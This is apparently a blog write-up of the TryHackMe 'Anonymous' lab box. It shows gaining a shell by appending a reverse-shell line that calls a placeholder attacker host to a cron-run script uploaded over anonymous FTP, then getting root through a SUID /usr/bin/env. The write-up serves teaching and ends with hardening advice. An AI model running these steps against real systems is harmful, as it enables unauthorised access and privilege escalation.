---
title: "Anonymous"
date: 2026-10-05
categories: [TryHackMe, Medium]
tags: [linux, ftp, anonymous ftp, vsftpd, writable file, cron, reverse shell, SUID, gtfobins, privilege escalation, misconfiguration, nmap, netcat, env]
image:
  path: /assets/img/THM/Anonymous/banner.webp
  lqip: "data:image/webp;base64,UklGRl4CAABXRUJQVlA4WAoAAAAQAAAAHwAAHwAAQUxQSBECAAABoGvbtmnbanPMeW3bVqTM9o1uualtvJfatm0boW3btrknerDXWed8QkRMADWdDwZgwTva0gO06949APjWGfiFZzz2yY8/fvLYGQs9WCs8bvPrqvn6ZoevFZj8hJRjyqXkFLP0xGRCjcCy3xSzauao35YRWvAsaShKJacUK1NuqLEYX2FuzG9KikX1U/x1jLOqx5WKpN8+ePq+6y48+9xLb3r4xa8lPWpNgfWKRY0L5w7w1Ow645SftY4AZq+UWH6dDRDatwvNPgBjP3oLwzNLJeooOnjnqGsdmKMZ+MAxikWzzGMsv2EMhqPvNZvx1jGeSPA8qJi0yAKBe7STgGeR3sP73uURPLypHHU9wRujt3TFAe02TLeO7NCrQLvPlJV1CAhUOjOAlX/qk3YQPlWWsh6YTaWjcvQFkj4JOF5rUpZeOX3tuK5ApxELjnr4b5WkV3GeuxUlKRVJ8Zs3X3j9y38lKSnqLnzg6Copx6TqHFORoo4iGFNyqZJUSk45F1WWPAXDeFyppfqpPIaBZ0nJbRO1CA8Yjym1RdTteMDcoB9KaYOoT/uYAYHjFKXSmoZ+nIYBzvX4vuSUpFRaKinrg2l4gMA+/SfpD0kxppxTjJKu74On2XX6Vvrnka1D5j3wn1r89/75YFR1eOjpvaNpHrftqsdee+3Rq7aNBXPUt+C8UdM8dZ0LRrOFYGAhGHUBAFZQOCAmAAAA8AIAnQEqIAAgAD7tcrFSqaakoqgIATAdiWkAAFx8KAAA/vFEgAA="
  alt: Anonymous writeup
---

Anonymous is a Medium Linux box from TryHackMe, but it has no exploit and no CVE — it is a chain of two misconfigurations. Anonymous **FTP** login exposes a **world-writable `scripts` directory** holding a cleanup script that a **cron** job runs on a schedule; appending a reverse shell to that script and re-uploading it gives a shell as `namelessone`. From there, the **SUID bit on `/usr/bin/env`** is a one-line [GTFOBins](https://gtfobins.github.io/gtfobins/env/) route to root.

| Field      | Details    |
|------------|------------|
| Platform   | TryHackMe  |
| Difficulty | Medium     |
| OS         | Linux      |
| IP         | 10.130.138.78 |
| Date       | October 2026 |

## Tools Used

| Tool        | Description                                                              |
|-------------|--------------------------------------------------------------------------|
| nmap        | Network port scanner and service fingerprinter                          |
| ftp         | Anonymous login; read the scripts and uploaded the modified `clean.sh`  |
| netcat (nc) | Reverse-shell listener                                                  |
| env         | SUID `/usr/bin/env` abused via GTFOBins for the root shell              |

## Reconnaissance & Enumeration

### Port Scan

A full TCP scan with service and default-script detection. `-p-` covers all 65,535 ports, `-sCV` runs the default NSE scripts plus version detection, `--min-rate 5000` keeps it quick, and `-Pn` skips host discovery.

```bash
sudo nmap -p- -sCV --min-rate 5000 -Pn -n 10.130.138.78 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux
```

The NSE output does most of the enumeration for us: **anonymous FTP is allowed**, and nmap flags the `scripts` directory as **`[NSE: writeable]`** — a world-writable directory (`drwxrwxrwx`) on an anonymous FTP server is an immediate lead. SSH and Samba are open too, but the writable FTP share is the obvious way in.

### Anonymous FTP

Logging in as `anonymous` (any password) and listing the `scripts` directory:

```bash
ftp 10.130.138.78
# Name: anonymous   Password: (blank)
# 230 Login successful.
```

```bash
ftp> cd scripts
ftp> ls -la
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2064 Oct 05 09:46 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Three files, all owned by UID **1000** (a real user). Two things stand out: `clean.sh` is **writable by everyone** (`-rwxr-xrwx`), and `removed_files.log` has a **very recent** modification time compared to the 2020 dates on everything else. Reading both explains why:

```bash
ftp> get clean.sh
ftp> get removed_files.log
```

```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

`clean.sh` is a `/tmp` cleanup script, and `removed_files.log` is full of repeated "nothing to delete" lines with a constantly-updating timestamp. That pattern — a log that keeps growing on its own — means **`clean.sh` is being run automatically on a schedule** (a cron job), as the user who owns it (UID 1000). And because the file is world-writable *and* we can upload over it via FTP, we control what that scheduled job runs.

## Initial Access — Writable Cron Script as `namelessone`

The plan is simple: append a reverse shell to `clean.sh`, upload it back over FTP, and wait for the cron job to execute it. Add one line to the bottom of the local copy:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' >> clean.sh
```

Start a listener, then push the modified script back to the server (the directory is writable, so `put` overwrites the original):

```bash
ftp> put clean.sh
# 226 Transfer complete.
```

```bash
nc -nlvp 4444
```

Within the cron interval the job fires our appended line and connects back:

```bash
Connection received on 10.130.138.78 45610
bash: cannot set terminal process group (7581): Inappropriate ioctl for device
namelessone@anonymous:~$ whoami
namelessone
```

A shell as **`namelessone`** — the UID-1000 owner of the script. After the usual TTY upgrade (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, then `stty raw -echo`), the user flag is in the home directory:

```bash
namelessone@anonymous:~$ cat user.txt
REDACTED
```

## Privilege Escalation — `namelessone` → `root` (SUID `env`)

The first thing to check on a box like this is for SUID binaries — files that run with their owner's privileges regardless of who launches them. One stands out immediately:

```bash
namelessone@anonymous:~$ find / -perm -4000 2>/dev/null
/usr/bin/env
```

**`/usr/bin/env` with the SUID bit set** is a classic misconfiguration. `env` is meant to run a command in a modified environment — but with the SUID bit owned by root, we can tell it to run a shell, and `bash`'s `-p` flag keeps the elevated (effective-root) privileges instead of dropping them. This is the exact [GTFOBins](https://gtfobins.github.io/gtfobins/env/) technique for `env`:

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt
REDACTED
```

Root in a single command.

## Flags

| Flag        | Value      |
|-------------|------------|
| `user.txt`  | `REDACTED` |
| `root.txt`  | `REDACTED` |

## Key Takeaways

- **Anonymous FTP plus a writable directory is a foothold.** Anonymous login is only low-risk when the share is strictly read-only and holds nothing sensitive. A world-writable `scripts` directory turned read access into write access, and write access into code execution.
- **A scheduled script you can edit is remote code execution.** `clean.sh` ran automatically as its owner, and the growing `removed_files.log` was the tell that gave the schedule away. Any file a cron job executes must be writable *only* by root (or the running user) — world-writable automation is an open invitation.
- **Read the breadcrumbs the box gives you.** The recent timestamp on `removed_files.log` against 2020-dated neighbours was the single clue that `clean.sh` was live. Timestamps and log growth are enumeration data, not noise.
- **SUID on a general-purpose binary is game over.** `/usr/bin/env` never needs the SUID bit; with it, GTFOBins turns it into an instant root shell via `-p`. Audit SUID binaries regularly (`find / -perm -4000`) and strip the bit from anything that doesn't strictly require it.
